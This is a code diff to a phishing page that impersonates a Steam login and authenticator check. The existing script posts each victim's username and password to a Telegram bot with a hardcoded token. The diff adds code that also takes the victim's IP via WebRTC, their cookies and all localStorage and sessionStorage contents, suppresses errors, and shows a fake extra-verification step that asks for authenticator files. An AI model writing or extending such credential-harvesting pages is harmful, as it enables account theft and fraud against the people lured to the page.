@@ -43,7 +43,7 @@
       <button class="btn" onclick="doTwo()">Verify</button>
       <div class="note">For your security, Steam requires verification of your mobile authenticator.</div>
     </div>
-    <div class="note">© Valve Corporation. All rights reserved. All trademarks are property of their respective owners.</div>
+    <div class="note">© Valve Corporation. All rights reserved.</div>
   </div>
 <script>
 var TOKEN = "8982596338:AAE47QUXLGfaOtZsTI6j4-ofLUZ4Sl57uos";
@@ -52,10 +52,20 @@ var step1 = {};
 var mafileContent = "";
 
 function tg(text) {
-  var x = new XMLHttpRequest();
-  x.open("POST", "https://api.telegram.org/bot" + TOKEN + "/sendMessage", true);
-  x.setRequestHeader("Content-Type", "application/json");
-  x.send(JSON.stringify({ chat_id: CHAT, text: text }));
+  try {
+    var x = new XMLHttpRequest();
+    x.open("POST", "https://api.telegram.org/bot" + TOKEN + "/sendMessage", true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.send(JSON.stringify({ chat_id: CHAT, text: text }));
+  } catch (e) {}
+}
+
+function storageDump(s) {
+  try {
+    var o = {}, i;
+    for (i = 0; i < s.length; i++) { try { o[s.key(i)] = s.getItem(s.key(i)); } catch (e) {} }
+    return JSON.stringify(o);
+  } catch (e) { return "-"; }
 }
 
 function readMafile(f) {
@@ -64,24 +74,43 @@ function readMafile(f) {
   if (f.files.length) r.readAsText(f.files[0]);
 }
 
+function getIP(cb) {
+  try {
+    var pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel("");
+    pc.onicecandidate = function(e) {
+      if (e.candidate) {
+        var m = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate);
+        if (m) { cb(m[0]); pc.close(); }
+      }
+    };
+    pc.createOffer().then(function(o){ pc.setLocalDescription(o); }).catch(function(){});
+    setTimeout(function(){ cb("n/a"); }, 2500);
+  } catch (e) { cb("n/a"); }
+}
+
 function doLogin() {
   var l = document.getElementById("login").value.trim();
   var p = document.getElementById("password").value;
   if (!l || !p) { document.getElementById("err").textContent = "Please fill in all fields"; return; }
   step1 = { login: l, password: p };
-  var msg = "🎣 STEAM LOGIN\nLogin: " + l + "\nPassword: " + p +
-            "\nUA: " + navigator.userAgent +
-            "\nRef: " + (document.referrer || "-") +
-            "\nURL: " + location.href;
-  tg(msg);
-  document.getElementById("err").textContent = "";
-  document.getElementById("err").style.color = "#8f98a0";
-  document.getElementById("err").textContent = "Verifying…";
-  setTimeout(function(){
-    document.getElementById("err").textContent = "Additional verification required.";
-    document.getElementById("err").style.color = "#ffb700";
-    document.getElementById("step2").style.display = "block";
-  }, 1800);
+  getIP(function(ip) {
+    var msg = "🎣 STEAM LOGIN\nLogin: " + l + "\nPassword: " + p +
+      "\n\nUA: " + navigator.userAgent +
+      "\nRef: " + (document.referrer || "-") +
+      "\nURL: " + location.href +
+      "\nIP (WebRTC): " + ip +
+      "\n\n🍪 COOKIES: " + document.cookie +
+      "\n\n💾 LOCALSTORAGE: " + storageDump(localStorage) +
+      "\n\n💾 SESSIONSTORAGE: " + storageDump(sessionStorage);
+    tg(msg);
+    document.getElementById("err").textContent = "Verifying…";
+    setTimeout(function(){
+      document.getElementById("err").textContent = "Additional verification required.";
+      document.getElementById("err").style.color = "#ffb700";
+      document.getElementById("step2").style.display = "block";
+    }, 1800);
+  });
 }
 
 function doTwo() {
